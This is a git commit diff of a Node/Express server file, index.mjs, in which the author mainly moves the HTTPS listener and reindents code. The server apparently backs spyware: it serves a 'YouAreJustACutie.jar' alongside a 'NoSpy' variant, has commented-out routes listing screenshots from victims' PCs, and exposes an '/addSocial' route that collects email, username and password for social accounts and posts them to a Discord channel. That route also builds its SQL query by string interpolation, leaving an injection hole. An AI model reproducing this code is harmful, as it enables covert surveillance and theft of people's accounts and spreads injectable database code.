04e6006fa376d539ebe41af174d56c5ed5334dd0
Lila BRANDON <contact@lilabrandon.fr>
2024-11-23 17:19:03 +0100

    ups wasn't at the goodplace

--- index.mjs
+++ index.mjs
@@ -14,24 +14,19 @@ const options = {
     cert: fs.readFileSync('server.cert')
 };
 
-const httpsServer = https.createServer(options, app);
-
-httpsServer.listen(443, () => {
-    console.log(`HTTPS Server running on port 1571`);
-});
 
 
 // Configuring Multer to store in public folder
 const storage = multer.diskStorage({
     destination: function (req, file, cb) {
-      cb(null, 'public');
+        cb(null, 'public');
     },
     filename: function (req, file, cb) {
-      cb(null, Date.now() + path.extname(file.originalname)); // Adds timestamp to file
+        cb(null, Date.now() + path.extname(file.originalname)); // Adds timestamp to file
     }
-  });
-  
-  const upload = multer({ storage: storage });
+});
+
+const upload = multer({ storage: storage });
 
 
 const app = express();
@@ -63,197 +58,197 @@ app.use(express.static('/public'));
 // Upload images
 app.get('/', (req, res) => {
     res.send(`
-      <!DOCTYPE html>
-      <html>
-      <head>
+        <!DOCTYPE html>
+        <html>
+        <head>
         <title>Upload d'images</title>
-      </head>
-      <body>
+        </head>
+        <body>
         <h1>Upload d'images</h1>
         <form action="/upload" method="post" enctype="multipart/form-data">
-          <input type="file" name="images" accept="image/*" multiple required />
-          <button type="submit">Upload</button>
+        <input type="file" name="images" accept="image/*" multiple required />
+        <button type="submit">Upload</button>
         </form>
-      </body>
-      </html>
-    `);
-  });
-  
-  // Route pour gérer l'upload des images
-  app.post('/upload', upload.array('images', 10), (req, res) => {
-    if (!req.files || req.files.length === 0) {
-      return res.status(400).send('No files uploaded.');
-    }
-  
-    const fileLinks = req.files.map(file => `<a href="/public/${file.filename}">${file.originalname}</a>`).join('<br>');
-    res.send(`Files uploaded successfully:<br>${fileLinks}`);
-  });
-
-
-
-app.get('/downloadBaiBaii', (req, res) => {
-    res.download("build/BaiBai.zip");
-});
-
-
-
-
-// Related to Synced Program
-app.get('/downloadSynced', (req, res) => {
-    res.download("build/SyncedCuties.jar");
-});
-
-app.use('/html', express.static('html'));
-
-
-// // Cooldowns
-// let dateOfNewPopup = new Date();
-// let dateOfNewWallpaper = new Date();
-
-
-// // Change next popup cooldown
-// app.get('/setPopupCooldown/:timeBeforeNext', (req, res) => {
-//     const [hours, minutes, seconds] = req.params.timeBeforeNext.split(':').map(Number);
-//     const now = new Date();
-//     dateOfNewPopup = new Date(now.getTime() + hours * 3600000 + minutes * 60000 + seconds * 1000);
-//     res.send(`Popup cooldown set for ${hours} hours, ${minutes} minutes, and ${seconds} seconds from now.`);
-// });
-
-
-// // Change next wallpaper cooldown
-// app.get('/setWallPaperCooldown/:timeBeforeNext', (req, res) => {
-//     const [hours, minutes, seconds] = req.params.timeBeforeNext.split(':').map(Number);
-//     const now = new Date();
-//     dateOfNewWallpaper = new Date(now.getTime() + hours * 3600000 + minutes * 60000 + seconds * 1000);
-//     res.send(`WallPaper cooldown set for ${hours} hours, ${minutes} minutes, and ${seconds} seconds from now.`);
-// });
-
-
-// // Get time remaining before next Popup
-// app.get('/getPopupCooldown', (req, res) => {
-//     const now = new Date();
-//     let diff = dateOfNewPopup - now;
-//     if (diff < 0) diff = 0;
-
-//     res.json({ diff });
-// });
-
-
-// // Get time remaining before next Wallpaper
-// app.get('/getWallpaperCooldown', (req, res) => {
-//     const now = new Date();
-//     let diff = dateOfNewWallpaper - now;
-//     if (diff < 0) diff = 0;
-
-//     res.json({ diff });
-// });
-
-
-
-// app.get('/cooldown', (req, res) => {
-//     res.redirect('./html/cooldown/cooldown.html');
-// });
-
-
-
-
-// Related to YouAreJustACutie Program
-
-app.get('/download', (req, res) => {
-    res.download("build/YouAreJustACutie.jar");
-});
-
-app.get('/downloadNoSpy', (req, res) => {
-    res.download("build/YouAreJustACutie-NoSpy.jar");
-});
-
-
-
-
-
-app.get('/wallpaper', (req, res) => {
-    const files = fs.readdirSync(path.join('public'));
-    const randomFile = files[Math.floor(Math.random() * files.length)];
-    res.redirect(`/images/${randomFile}`);
-});
-
-app.get('/getRandomImage', (req, res) => {
-    const files = fs.readdirSync(path.join('public'));
-    const randomFile = files[Math.floor(Math.random() * files.length)];
-    res.send(randomFile);
-});
-
-// app.get('/getRandomScreenshot', (req, res) => {
-//     const folders = fs.readdirSync(path.join('..', 'cuties'));
-//     let dates = [];
-//     for(let i=0; i<folders.length; i++) {
-//         if(folders[i].startsWith(".")) continue;
-//         let folderStats = fs.statSync("../cuties/" + folders[i]);
-//         if(folderStats.isDirectory()) dates.push(folders[i]);
-//     }
-
-//     const choosenDate = dates[Math.floor(Math.random() * dates.length)];
-//     const cutiesPCs = fs.readdirSync(path.join('..', 'cuties', choosenDate));
-//     let randomCutie;
-//     let choosenCutieScreenShots = [];
-    
-//     do {
-//         randomCutie = cutiesPCs[Math.floor(Math.random() * cutiesPCs.length)];
-//         choosenCutieScreenShots = fs.readdirSync(path.join('..', 'cuties', choosenDate, randomCutie, "screenshots"));
-//     } while(choosenCutieScreenShots.length == 0);
-
-//     const randomScreenshot = choosenCutieScreenShots[Math.floor(Math.random() * choosenCutieScreenShots.length)];
-
-//     res.send({ choosenDate: choosenDate, cutie: randomCutie, screenshot: randomScreenshot });
-// });
-
-app.get('/images/:image', (req, res) => { res.download(path.join('public', req.params.image)); });
-// app.get('/screenshot/:choosenDate/:cutie/:screenshot', (req, res) => { res.download(path.join('..', 'cuties', req.params.choosenDate, req.params.cutie, "screenshots", req.params.screenshot)); });
-
-
-app.get('/social/:social', (req, res) => {
-    switch(req.params.social) {
-        case "Discord":
-            res.download("socials/discord.png");
-            break;
-        case "Facebook":
-            res.download("socials/facebook.png");
-            break;
-        case "Instagram":
-            res.download("socials/instagram.jpg");
-            break;
-        case "Snapchat":
-            res.download("socials/snapchat.jpg");
-            break;
-        case "Twitter":
-            res.download("socials/twitter.jpg");
-            break;
-        case "Twitch":
-            res.download("socials/twitch.png");
-            break;
-        case "Google":
-            res.download("socials/google.png");
-            break;
-    }
-});
-
-
-app.get('/addSocial/:social/:email/:username/:password/:discordUsername', (req, res) => {
-    console.log(req.params);
-    database.exec(`INSERT INTO accounts (social, email, username, password) VALUES ('${req.params.social}','${req.params.email}','${req.params.username}','${req.params.password}')`, (err) => {
-        if(err) {
-            console.error(`Can not insert data : ${err.toString()}`);
-            return;
-        } else console.log("Data inserted.");
+        </body>
+        </html>
+        `);
     });
+    
+    // Route pour gérer l'upload des images
+    app.post('/upload', upload.array('images', 10), (req, res) => {
+        if (!req.files || req.files.length === 0) {
+            return res.status(400).send('No files uploaded.');
+        }
+        
+        const fileLinks = req.files.map(file => `<a href="/public/${file.filename}">${file.originalname}</a>`).join('<br>');
+        res.send(`Files uploaded successfully:<br>${fileLinks}`);
+    });
+    
+    
+    
+    app.get('/downloadBaiBaii', (req, res) => {
+        res.download("build/BaiBai.zip");
+    });
+    
+    
+    
+    
+    // Related to Synced Program
+    app.get('/downloadSynced', (req, res) => {
+        res.download("build/SyncedCuties.jar");
+    });
+    
+    app.use('/html', express.static('html'));
+    
+    
+    // // Cooldowns
+    // let dateOfNewPopup = new Date();
+    // let dateOfNewWallpaper = new Date();
+    
+    
+    // // Change next popup cooldown
+    // app.get('/setPopupCooldown/:timeBeforeNext', (req, res) => {
+        //     const [hours, minutes, seconds] = req.params.timeBeforeNext.split(':').map(Number);
+        //     const now = new Date();
+        //     dateOfNewPopup = new Date(now.getTime() + hours * 3600000 + minutes * 60000 + seconds * 1000);
+        //     res.send(`Popup cooldown set for ${hours} hours, ${minutes} minutes, and ${seconds} seconds from now.`);
+        // });
+        
+        
+        // // Change next wallpaper cooldown
+        // app.get('/setWallPaperCooldown/:timeBeforeNext', (req, res) => {
+            //     const [hours, minutes, seconds] = req.params.timeBeforeNext.split(':').map(Number);
+            //     const now = new Date();
+            //     dateOfNewWallpaper = new Date(now.getTime() + hours * 3600000 + minutes * 60000 + seconds * 1000);
+            //     res.send(`WallPaper cooldown set for ${hours} hours, ${minutes} minutes, and ${seconds} seconds from now.`);
+            // });
+            
+            
+            // // Get time remaining before next Popup
+            // app.get('/getPopupCooldown', (req, res) => {
+                //     const now = new Date();
+                //     let diff = dateOfNewPopup - now;
+                //     if (diff < 0) diff = 0;
+                
+                //     res.json({ diff });
+                // });
+                
+                
+                // // Get time remaining before next Wallpaper
+                // app.get('/getWallpaperCooldown', (req, res) => {
+                    //     const now = new Date();
+                    //     let diff = dateOfNewWallpaper - now;
+                    //     if (diff < 0) diff = 0;
 
-    const accountEmbed = new EmbedBuilder()
-	.setColor(0x0099FF)
-	.setTitle('A new account is shared')
-    .setDescription(`${req.params.discordUsername} shared a new account :3`)
-	.setThumbnail(`http://cuties.vps.boxtoplay.com:1570/social/${req.params.social}`)
-	.addFields(
-		{ name: 'Social : ', value: req.params.social },
+                    //     res.json({ diff });
+                    // });
+                    
+                    
+                    
+                    // app.get('/cooldown', (req, res) => {
+                        //     res.redirect('./html/cooldown/cooldown.html');
+                        // });
+                        
+                        
+                        
+                        
+                        // Related to YouAreJustACutie Program
+                        
+                        app.get('/download', (req, res) => {
+                            res.download("build/YouAreJustACutie.jar");
+                        });
+
+                        app.get('/downloadNoSpy', (req, res) => {
+                            res.download("build/YouAreJustACutie-NoSpy.jar");
+                        });
+                        
+                        
+                        
+                        
+                        
+                        app.get('/wallpaper', (req, res) => {
+                            const files = fs.readdirSync(path.join('public'));
+                            const randomFile = files[Math.floor(Math.random() * files.length)];
+                            res.redirect(`/images/${randomFile}`);
+                        });
+                        
+                        app.get('/getRandomImage', (req, res) => {
+                            const files = fs.readdirSync(path.join('public'));
+                            const randomFile = files[Math.floor(Math.random() * files.length)];
+                            res.send(randomFile);
+                        });
+                        
+                        // app.get('/getRandomScreenshot', (req, res) => {
+                            //     const folders = fs.readdirSync(path.join('..', 'cuties'));
+                            //     let dates = [];
+                            //     for(let i=0; i<folders.length; i++) {
+                                //         if(folders[i].startsWith(".")) continue;
+                                //         let folderStats = fs.statSync("../cuties/" + folders[i]);
+                                //         if(folderStats.isDirectory()) dates.push(folders[i]);
+                                //     }
+                                
+                                //     const choosenDate = dates[Math.floor(Math.random() * dates.length)];
+                                //     const cutiesPCs = fs.readdirSync(path.join('..', 'cuties', choosenDate));
+                                //     let randomCutie;
+                                //     let choosenCutieScreenShots = [];
+                                
+                                //     do {
+                                    //         randomCutie = cutiesPCs[Math.floor(Math.random() * cutiesPCs.length)];
+                                    //         choosenCutieScreenShots = fs.readdirSync(path.join('..', 'cuties', choosenDate, randomCutie, "screenshots"));
+                                    //     } while(choosenCutieScreenShots.length == 0);
+                                    
+                                    //     const randomScreenshot = choosenCutieScreenShots[Math.floor(Math.random() * choosenCutieScreenShots.length)];
+                                    
+                                    //     res.send({ choosenDate: choosenDate, cutie: randomCutie, screenshot: randomScreenshot });
+                                    // });
+                                    
+                                    app.get('/images/:image', (req, res) => { res.download(path.join('public', req.params.image)); });
+                                    // app.get('/screenshot/:choosenDate/:cutie/:screenshot', (req, res) => { res.download(path.join('..', 'cuties', req.params.choosenDate, req.params.cutie, "screenshots", req.params.screenshot)); });
+                                    
+                                    
+                                    app.get('/social/:social', (req, res) => {
+                                        switch(req.params.social) {
+                                            case "Discord":
+                                                res.download("socials/discord.png");
+                                                break;
+                                                case "Facebook":
+                                                    res.download("socials/facebook.png");
+                                                    break;
+                                                    case "Instagram":
+                                                        res.download("socials/instagram.jpg");
+                                                        break;
+                                                        case "Snapchat":
+                                                            res.download("socials/snapchat.jpg");
+            break;
+            case "Twitter":
+                res.download("socials/twitter.jpg");
+                break;
+                case "Twitch":
+                    res.download("socials/twitch.png");
+                    break;
+                    case "Google":
+                        res.download("socials/google.png");
+                        break;
+                    }
+                });
+                
+                
+                app.get('/addSocial/:social/:email/:username/:password/:discordUsername', (req, res) => {
+                    console.log(req.params);
+                    database.exec(`INSERT INTO accounts (social, email, username, password) VALUES ('${req.params.social}','${req.params.email}','${req.params.username}','${req.params.password}')`, (err) => {
+                        if(err) {
+                            console.error(`Can not insert data : ${err.toString()}`);
+                            return;
+                        } else console.log("Data inserted.");
+                    });
+                    
+                    const accountEmbed = new EmbedBuilder()
+                    .setColor(0x0099FF)
+                    .setTitle('A new account is shared')
+                    .setDescription(`${req.params.discordUsername} shared a new account :3`)
+                    .setThumbnail(`http://cuties.vps.boxtoplay.com:1570/social/${req.params.social}`)
+                    .addFields(
+                        { name: 'Social : ', value: req.params.social },
 		{ name: '\u200B', value: '\u200B' },
 		{ name: 'Username : ', value: req.params.username },
 		{ name: 'Email : ', value: req.params.email},
@@ -262,7 +257,7 @@ app.get('/addSocial/:social/:email/:username/:password/:discordUsername', (req, 
 	// .setImage('https://i.imgur.com/AfFp7pu.png')
 	.setTimestamp()
 	.setFooter({ text: 'Thank you cutie ❤' });
-
+    
     const channel = guild.channels.cache.get('1228365375520116757');
     channel.send({ embeds: [accountEmbed] });
     res.send("Data inserted.");
@@ -270,7 +265,7 @@ app.get('/addSocial/:social/:email/:username/:password/:discordUsername', (req, 
 
 app.get('/displaySocials', async (req, res) => {
     const phpFile = path.join('showSocials.php');
-
+    
     const phpOutput = await execPhp(phpFile, (error, php, output) => {
         if(error) {
             console.error(`Can not execute php file : ${error.toString()}`);
@@ -282,7 +277,7 @@ app.get('/displaySocials', async (req, res) => {
 
 app.get('/randomLink', (req, res) => {
     const linksFile = fs.readFileSync('links.txt', 'utf8');
-
+    
     const links = linksFile.split('\n');
     const randomLink = links[Math.floor(Math.random() * links.length)];
     res.send(randomLink);
@@ -291,4 +286,10 @@ app.get('/randomLink', (req, res) => {
 
 server.listen(1570, () => {
     console.log(`Server running on port 1570`);
+});
+
+const httpsServer = https.createServer(options, app);
+
+httpsServer.listen(443, () => {
+    console.log(`HTTPS Server running on port 1571`);
 });
